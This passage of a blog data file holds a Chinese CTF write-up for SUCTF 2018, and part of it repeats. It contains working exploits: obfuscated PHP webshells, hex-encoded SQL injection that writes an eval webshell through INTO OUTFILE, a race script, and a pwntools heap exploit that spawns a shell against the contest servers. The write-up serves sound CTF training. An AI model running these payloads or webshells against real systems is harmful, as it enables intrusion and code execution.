'1')\nr.sendlineafter('Size:', '10')\n\n#embed()\nr.interactive()\n```\n\n","slug":"suctf2018","published":1,"updated":"2018-07-23T12:35:27.661Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjkia12il001rqkdlsr418jqk","content":"<h1 id=\"SUCTF2018\"><a href=\"#SUCTF2018\" class=\"headerlink\" title=\"SUCTF2018\"></a>SUCTF2018</h1><a id=\"more\"></a>\n<p>赛后总结</p>\n<p>docker仓库：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">suctf/2018-web-multi_sql</span><br><span class=\"line\">suctf/2018-web-homework</span><br><span class=\"line\">suctf/2018-web-hateit</span><br><span class=\"line\">suctf/2018-web-getshell</span><br><span class=\"line\">suctf/2018-web-annonymous</span><br><span class=\"line\">suctf/2018-pwn-note</span><br><span class=\"line\">suctf/2018-pwn-noend</span><br><span class=\"line\">suctf/2018-pwn-lock2</span><br><span class=\"line\">suctf/2018-pwn-heapprint</span><br><span class=\"line\">suctf/2018-pwn-heap</span><br><span class=\"line\">suctf/2018-misc-padding</span><br><span class=\"line\">suctf/2018-misc-game</span><br><span class=\"line\">suctf/2018-misc-rsagood</span><br><span class=\"line\">suctf/2018-misc-rsa</span><br><span class=\"line\">suctf/2018-misc-enjoy</span><br><span class=\"line\">suctf/2018-misc-pass</span><br></pre></td></tr></table></figure>\n<h2 id=\"Anonymous\"><a href=\"#Anonymous\" class=\"headerlink\" title=\"Anonymous\"></a>Anonymous</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$MY = create_function(&quot;&quot;,&quot;die(`cat flag.php`);&quot;);</span><br><span class=\"line\">$hash = bin2hex(openssl_random_pseudo_bytes(32));</span><br><span class=\"line\">eval(&quot;function SUCTF_$hash()&#123;&quot;</span><br><span class=\"line\">    .&quot;global \\$MY;&quot;</span><br><span class=\"line\">    .&quot;\\$MY();&quot;</span><br><span class=\"line\">    .&quot;&#125;&quot;);</span><br><span class=\"line\">if(isset($_GET[&apos;func_name&apos;]))&#123;</span><br><span class=\"line\">    $_GET[&quot;func_name&quot;]();</span><br><span class=\"line\">    die();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">show_source(__FILE__);</span><br></pre></td></tr></table></figure>\n<p>solve.py</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\">import socket</span><br><span class=\"line\">import time</span><br><span class=\"line\">from multiprocessing.dummy import Pool as ThreadPool</span><br><span class=\"line\">try:</span><br><span class=\"line\">    requests.packages.urllib3.disable_warnings()</span><br><span class=\"line\">except:</span><br><span class=\"line\">    pass</span><br><span class=\"line\"></span><br><span class=\"line\">def run(i):</span><br><span class=\"line\">    while 1:</span><br><span class=\"line\">        HOST = &apos;web.suctf.asuri.org&apos;</span><br><span class=\"line\">        PORT = 81</span><br><span class=\"line\">        url = &quot;http://web.suctf.asuri.org:81/index.php&quot;</span><br><span class=\"line\">        requests.get(url)</span><br><span class=\"line\">        print &apos;ok&apos;</span><br><span class=\"line\">        time.sleep(0.5)</span><br><span class=\"line\">        print requests.get(&apos;http://web.suctf.asuri.org:81/index.php?func_name=%00lambda_1&apos;).content</span><br><span class=\"line\"></span><br><span class=\"line\">i = 8</span><br><span class=\"line\">pool = ThreadPool( i )</span><br><span class=\"line\">result = pool.map_async( run, range(i) ).get(0xffff)</span><br></pre></td></tr></table></figure>\n<h2 id=\"Getshell\"><a href=\"#Getshell\" class=\"headerlink\" title=\"Getshell\"></a>Getshell</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if($contents=file_get_contents($_FILES[&quot;file&quot;][&quot;tmp_name&quot;]))&#123;</span><br><span class=\"line\">    $data=substr($contents,5);</span><br><span class=\"line\">    foreach ($black_char as $b) &#123;</span><br><span class=\"line\">        if (stripos($data, $b) !== false)&#123;</span><br><span class=\"line\">            die(&quot;illegal char&quot;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;     </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>使用burp intruder找出未被过滤的可打印字符串。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$()[]_~=;.</span><br></pre></td></tr></table></figure>\n<p>跑的时候需注意<code>Intruder=&gt;payloads=&gt;payload encoding</code> 处需取消勾选，否则会因为字符编码而不能得到正确的白名单。</p>\n<p>跑的时候可以在<code>Intruder=&gt;options=&gt;Grep-Match</code> 中选择 flag <code>illegal</code> ，这样就可以快速看到那些字符是合法的了。</p>\n<p>shell:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?= $_=_==_;$__=~一[$_];$___=~了[$_];$____=~端[$_];$_____=~得[$_];$______=~第[$_];$_______=~学[$_];$_=_.$__.$___.$____;$_=$$_;$__=$_____.$______.$______.$___.$_______.$____;$__($_[_]);</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?= </span><br><span class=\"line\">$_=_==_;//1</span><br><span class=\"line\">$__=~一[$_];//G</span><br><span class=\"line\">$___=~了[$_];//E</span><br><span class=\"line\">$____=~端[$_];//T</span><br><span class=\"line\">$_____=~得[$_];//A</span><br><span class=\"line\">$______=~第[$_];//S</span><br><span class=\"line\">$_______=~学[$_];//R</span><br><span class=\"line\">$_=_.$__.$___.$____;//_GET</span><br><span class=\"line\">$_=$$_;//$_GET</span><br><span class=\"line\">$__=$_____.$______.$______.$___.$_______.$____;//ASSERT</span><br><span class=\"line\">$__($_[_]);//ASSERT($_GET[_]);</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?= $_=_==_;$__=~一[$_];$___=~了[$_];$____=~端[$_];$_=_.$__.$___.$____;$_=$$_;$_[_]($_[__]);</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$_=_==_;//1</span><br><span class=\"line\">$__=~一[$_];//G</span><br><span class=\"line\">$___=~了[$_];//E</span><br><span class=\"line\">$____=~端[$_];//T</span><br><span class=\"line\">$_=_.$__.$___.$____;//_GET</span><br><span class=\"line\">$_=$$_;//$_GET</span><br><span class=\"line\">$_[_]($_[__]);//$_GET[_]($_GET[__]);</span><br></pre></td></tr></table></figure>\n<h2 id=\"MultiSql\"><a href=\"#MultiSql\" class=\"headerlink\" title=\"MultiSql\"></a>MultiSql</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@@secure_file_priv           限制intofile可以写入的文件目录</span><br></pre></td></tr></table></figure>\n<p>waf.php</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">\tfunction waf($str)&#123;</span><br><span class=\"line\">\t\t$black_str = &quot;/(and|or|union|sleep|select|substr|order|left|right|order|by|where|rand|exp|updatexml|insert|update|dorp|delete|[|]|[&amp;])/i&quot;;</span><br><span class=\"line\">\t\t$str = preg_replace($black_str, &quot;@@&quot;,$str);</span><br><span class=\"line\">\t\treturn addslashes($str);</span><br><span class=\"line\">\t&#125;</span><br></pre></td></tr></table></figure>\n<p>sql注入关键代码:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if (isset($_SESSION[&apos;user_name&apos;])) &#123;</span><br><span class=\"line\">\tinclude_once(&apos;../header.php&apos;);</span><br><span class=\"line\">\tif (!isset($SESSION[&apos;user_id&apos;])) &#123;</span><br><span class=\"line\">\t\t$sql = &quot;SELECT * FROM dwvs_user_message WHERE DWVS_user_name =&quot;.&quot;&apos;&#123;$_SESSION[&apos;user_name&apos;]&#125;&apos;&quot;;</span><br><span class=\"line\">\techo $sql;\t\t</span><br><span class=\"line\">$data = mysqli_query($connect,$sql) or die(&apos;Mysql Error!!&apos;);</span><br><span class=\"line\">\t\t$result = mysqli_fetch_array($data);</span><br><span class=\"line\">\t\tvar_dump($result);</span><br><span class=\"line\">\t\t$_SESSION[&apos;user_id&apos;] = $result[&apos;DWVS_user_id&apos;];</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t$html_avatar = htmlspecialchars($_SESSION[&apos;user_favicon&apos;]);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tif(isset($_GET[&apos;id&apos;]))&#123;</span><br><span class=\"line\">\t\t$id=waf($_GET[&apos;id&apos;]);</span><br><span class=\"line\">\t\t$sql = &quot;SELECT * FROM dwvs_user_message WHERE DWVS_user_id =&quot;.$id;</span><br><span class=\"line\">\t\t$data = mysqli_multi_query($connect,$sql) or die();</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t$result = mysqli_store_result($connect);</span><br><span class=\"line\">\t\t$row = mysqli_fetch_row($result);</span><br><span class=\"line\">\t\techo &apos;&lt;h1&gt;user_id:&apos;.$row[0].&quot;&lt;/h1&gt;&lt;br&gt;&lt;h2&gt;user_name:&quot;.$row[1].&quot;&lt;/h2&gt;&lt;br&gt;&lt;h3&gt;注册时间：&quot;.$row[4].&quot;&lt;/h3&gt;&quot;;</span><br><span class=\"line\">\t\tmysqli_free_result($result);</span><br><span class=\"line\">\t\tdie();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tmysqli_close($connect);</span><br></pre></td></tr></table></figure>\n<p>使用set跟hex编码的方式执行sql语句:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select user()                    =&gt;   0x73656c65637420757365722829</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set @num=0x73656c65637420757365722829;prepare t from @num;execute t;</span><br></pre></td></tr></table></figure>\n<p>写shell:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php eval($_REQUEST[&apos;55332&apos;]);?&gt;       =&gt;   0x3c3f706870206576616c28245f524551554553545b273535333332275d293b3f3e</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set @num=0x73656c65637420307833633366373036383730323036353736363136633238323435663532343535313535343535333534356232373335333533333333333232373564323933623366336520696e746f206f757466696c6520272f7661722f7777772f68746d6c2f66617669636f6e2f77666f782e70687027;prepare t from @num;execute t;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select 0x3c3f706870206576616c28245f524551554553545b273535333332275d293b3f3e into outfile &apos;/var/www/html/favicon/wfox.php&apos;</span><br></pre></td></tr></table></figure>\n<p>方法二:</p>\n<p>注册两个账号:</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?=$_GET[c];?&gt;                                        </span><br><span class=\"line\"></span><br><span class=\"line\">&lt;?=$_GET[c];?&gt;'into outfile'/var/www/html/favicon/c1.php</span><br></pre></td></tr></table></figure>\n<p>这样，当使用第二个账号登录的时候:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$sql = &quot;SELECT * FROM dwvs_user_message WHERE DWVS_user_name =&quot;.&quot;&apos;&#123;$_SESSION[&apos;user_name&apos;]&#125;&apos;&quot;;</span><br><span class=\"line\">$sql = &quot;SELECT * FROM dwvs_user_message WHERE DWVS_user_name =&apos;&lt;?=$_GET[c];?&gt;&apos;into outfile&apos;/var/www/html/favicon/c1.php &apos; into outfile &apos;/var/www/html/favicon/c1.php&apos;;</span><br></pre></td></tr></table></figure>\n<p>就会将我们的shell写入账号。</p>\n<h1 id=\"PWN\"><a href=\"#PWN\" class=\"headerlink\" title=\"PWN\"></a>PWN</h1><h2 id=\"Note\"><a href=\"#Note\" class=\"headerlink\" title=\"Note\"></a>Note</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/usr/bin/env python2</span><br><span class=\"line\"></span><br><span class=\"line\">from pwn import *</span><br><span class=\"line\">from IPython import embed</span><br><span class=\"line\">import re</span><br><span class=\"line\"></span><br><span class=\"line\">context.arch = &apos;amd64&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">r = remote(&apos;pwn.suctf.asuri.org&apos;, 20003)</span><br><span class=\"line\"></span><br><span class=\"line\">def add(size, content):</span><br><span class=\"line\">    r.sendlineafter(&apos;&gt;&gt;&apos;, &apos;1&apos;)</span><br><span class=\"line\">    r.sendlineafter(&apos;Size:&apos;, str(size))</span><br><span class=\"line\">    r.sendlineafter(&apos;Content:&apos;, content)</span><br><span class=\"line\"></span><br><span class=\"line\">def show(idx):</span><br><span class=\"line\">    r.sendlineafter(&apos;&gt;&gt;&apos;, &apos;2&apos;)</span><br><span class=\"line\">    r.sendlineafter(&apos;Index:&apos;, str(idx))</span><br><span class=\"line\">    r.recvuntil(&apos;Content:&apos;)</span><br><span class=\"line\">    return r.recvuntil(&apos;1.Add a not&apos;, drop=True)</span><br><span class=\"line\"></span><br><span class=\"line\">def pandora():</span><br><span class=\"line\">    r.sendlineafter(&apos;&gt;&gt;&apos;, &apos;3&apos;)</span><br><span class=\"line\">    r.sendlineafter(&apos;yes:1)&apos;, &apos;1&apos;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">add(10, &apos;a&apos;*24+flat(0xec1))</span><br><span class=\"line\">add(4000, &apos;a&apos;)</span><br><span class=\"line\">pandora()</span><br><span class=\"line\">x = show(0).strip()</span><br><span class=\"line\">heap = u64(x.ljust(8, &apos;\\x00&apos;)) - 0x140</span><br><span class=\"line\">print &apos;heap:&apos;, hex(heap)</span><br><span class=\"line\">add(0x90-8, &apos;a&apos;*7)</span><br><span class=\"line\">x = show(1).strip()</span><br><span class=\"line\">libc = u64(x.ljust(8, &apos;\\x00&apos;)) - 0x3bfb58</span><br><span class=\"line\">print &apos;libc:&apos;, hex(libc)</span><br><span class=\"line\"></span><br><span class=\"line\">#_IO_list_all = libc + 0x3c5520</span><br><span class=\"line\">_IO_list_all = libc + 0x3c0500</span><br><span class=\"line\">_IO_str_jumps = libc + 0x3bc4c0</span><br><span class=\"line\">#system = libc + 0x45390</span><br><span class=\"line\">system = libc + 0x456d0</span><br><span class=\"line\">pop_rax_rbx_rbp = libc + 0x1fa71</span><br><span class=\"line\">ret = libc + 0x1fa74</span><br><span class=\"line\">add(10, flat(</span><br><span class=\"line\">    &apos;a&apos;*16,</span><br><span class=\"line\">    0x0, 0x61,</span><br><span class=\"line\">    0, _IO_list_all-0x10,</span><br><span class=\"line\">    0, 1,</span><br><span class=\"line\">    0, heap+0x1a0, heap+0x1a0,      # buf_base to heap &amp; buf_end-buf_base==0</span><br><span class=\"line\">    [0]*18, _IO_str_jumps,</span><br><span class=\"line\">    ret, system,                    # malloc do nothing, free(buf_base) == system(&apos;/bin/sh&apos;)</span><br><span class=\"line\">    &apos;/bin/sh\\x00&apos;,</span><br><span class=\"line\">))</span><br><span class=\"line\"></span><br><span class=\"line\">#raw_input(&quot;@&quot;)</span><br><span class=\"line\">r.sendlineafter(&apos;&gt;&gt;&apos;, &apos;1&apos;)</span><br><span class=\"line\">r.sendlineafter(&apos;Size:&apos;, &apos;10&apos;)</span><br><span class=\"line\"></span><br><span class=\"line\">#embed()</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"<h1 id=\"SUCTF2018\"><a href=\"#SUCTF2018\" class=\"headerlink\" title=\"SUCTF2018\"></a>SUCTF2018</h1>","more":"<p>赛后总结</p>\n<p>docker仓库：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">suctf/2018-web-multi_sql</span><br><span class=\"line\">suctf/2018-web-homework</span><br><span class=\"line\">suctf/2018-web-hateit</span><br><span class=\"line\">suctf/2018-web-getshell</span><br><span class=\"line\">suctf/2018-web-annonymous</span><br><span class=\"line\">suctf/2018-pwn-note</span><br><span class=\"line\">suctf/2018-pwn-noend</span><br><span class=\"line\">suctf/2018-pwn-lock2</span><br><span class=\"line\">suctf/2018-pwn-heapprint</span><br><span class=\"line\">suctf/2018-pwn-heap</span><br><span class=\"line\">suctf/2018-misc-padding</span><br><span class=\"line\">suctf/2018-misc-game</span><br><span class=\"line\">suctf/2018-misc-rsagood</span><br><span class=\"line\">suctf/2018-misc-rsa</span><br><span class=\"line\">suctf/2018-misc-enjoy</span><br><span class=\"line\">suctf/2018-misc-pass</span><br></pre></td></tr></table></figure>\n<h2 id=\"Anonymous\"><a href=\"#Anonymous\" class=\"headerlink\" title=\"Anonymous\"></a>Anonymous</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$MY = create_function(&quot;&quot;,&quot;die(`cat flag.php`);&quot;);</span><br><span class=\"line\">$hash = bin2hex(openssl_random_pseudo_bytes(32));</span><br><span class=\"line\">eval(&quot;function SUCTF_$hash()&#123;&quot;</span><br><span class=\"line\">    .&quot;global \\$MY;&quot;</span><br><span class=\"line\">    .&quot;\\$MY();&quot;</span><br><span class=\"line\">    .&quot;&#125;&quot;);</span><br><span class=\"line\">if(isset($_GET[&apos;func_name&apos;]))&#123;</span><br><span class=\"line\">    $_GET[&quot;func_name&quot;]();</span><br><span class=\"line\">    die();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">show_source(__FILE__);</span><br></pre></td></tr></table></figure>\n<p>solve.py</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\">import socket</span><br><span class=\"line\">import time</span><br><span class=\"line\">from multiprocessing.dummy import Pool as ThreadPool</span><br><span class=\"line\">try:</span><br><span class=\"line\">    requests.packages.urllib3.disable_warnings()</span><br><span class=\"line\">except:</span><br><span class=\"line\">    pass</span><br><span class=\"line\"></span><br><span class=\"line\">def run(i):</span><br><span class=\"line\">    while 1:</span><br><span class=\"line\">        HOST = &apos;web.suctf.asuri.org&apos;</span><br><span class=\"line\">        PORT = 81</span><br><span class=\"line\">        url = &quot;http://web.suctf.asuri.org:81/index.php&quot;</span><br><span class=\"line\">        requests.get(url)</span><br><span class=\"line\">        print &apos;ok&apos;</span><br><span class=\"line\">        time.sleep(0.5)</span><br><span class=\"line\">        print requests.get(&apos;http://web.suctf.asuri.org:81/index.php?func_name=%00lambda_1&apos;).content</span><br><span class=\"line\"></span><br><span class=\"line\">i = 8</span><br><span class=\"line\">pool = ThreadPool( i )</span><br><span class=\"line\">result = pool.map_async( run, range(i) ).get(0xffff)</span><br></pre></td></tr></table></figure>\n<h2 id=\"Getshell\"><a href=\"#Getshell\" class=\"headerlink\" title=\"Getshell\"></a>Getshell</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if($contents=file_get_contents($_FILES[&quot;file&quot;][&quot;tmp_name&quot;]))&#123;</span><br><span class=\"line\">    $data=substr($contents,5);</span><br><span class=\"line\">    foreach ($black_char as $b) &#123;</span><br><span class=\"line\">        if (stripos($data, $b) !== false)&#123;</span><br><span class=\"line\">            die(&quot;illegal char&quot;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;     </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>使用burp intruder找出未被过滤的可打印字符串。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$()[]_~=;.</span><br></pre></td></tr></table></figure>\n<p>跑的时候需注意<code>Intruder=&gt;payloads=&gt;payload encoding</code> 处需取消勾选，否则会因为字符编码而不能得到正确的白名单。</p>\n<p>跑的时候可以在<code>Intruder=&gt;options=&gt;Grep-Match</code> 中选择 flag <code>illegal</code> ，这样就可以快速看到那些字符是合法的了。</p>\n<p>shell:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?= $_=_==_;$__=~一[$_];$___=~了[$_];$____=~端[$_];$_____=~得[$_];$______=~第[$_];$_______=~学[$_];$_=_.$__.$___.$____;$_=$$_;$__=$_____.$______.$______.$___.$_______.$____;$__($_[_]);</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?= </span><br><span class=\"line\">$_=_==_;//1</span><br><span class=\"line\">$__=~一[$_];//G</span><br><span class=\"line\">$___=~了[$_];//E</span><br><span class=\"line\">$____=~端[$_];//T</span><br><span class=\"line\">$_____=~得[$_];//A</span><br><span class=\"line\">$______=~第[$_];//S</span><br><span class=\"line\">$_______=~学[$_];//R</span><br><span class=\"line\">$_=_.$__.$___.$____;//_GET</span><br><span class=\"line\">$_=$$_;//$_GET</span><br><span class=\"line\">$__=$_____.$______.$______.$___.$_______.$____;//ASSERT</span><br><span class=\"line\">$__($_[_]);//ASSERT($_GET[_]);</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?= $_=_==_;$__=~一[$_];$___=~了[$_];$____=~端[$_];$_=_.$__.$___.$____;$_=$$_;$_[_]($_[__]);</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span 